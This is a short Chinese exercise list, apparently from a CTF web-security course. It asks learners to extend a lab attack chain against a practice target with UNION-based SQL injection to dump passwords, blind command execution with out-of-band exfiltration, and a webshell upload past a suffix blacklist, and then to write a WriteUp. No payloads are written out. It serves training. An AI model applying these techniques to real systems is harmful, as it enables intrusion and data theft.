1. 给本章战例的靶加一环：`app.php` 前面加一个登录页，账号密码藏在一张 SQLite 表里，用 [[W04-SQL注入|W04]] 的联合查询注入登出密码——把三环链扩成四环，重画 5.2 的链路图。
2. 把 `$cmd` 里的 `system` 换成不回显的 `exec`（结果不打印），重打第三环：任选 [[W05-命令注入与代码执行#6. 无回显 RCE|W05 第 6 节]]的延时判定、外带或写文件一条路把 flag 拿出来，体会"没回显"和"没执行"的差别。
3. 把命令注入点换成一个后缀黑名单上传点（[[W07-文件上传|W07]]），上传马拿到同一台靶的 RCE：对比两条链的复盘差异——入口变了，链路图上只动两个节点。
4. 给战例写一篇完整 WriteUp：按 [[R17-赛事策略与团队协作#7.1 标准结构模板|R17 7.1]] 的模板填，命令与输出直接取自本章第 4 节，写完对照 [[R17-赛事策略与团队协作#7.2 合格 WriteUp 的自检清单|R17 7.2]] 的清单逐项过——这是下场比赛前最省时间的演练。
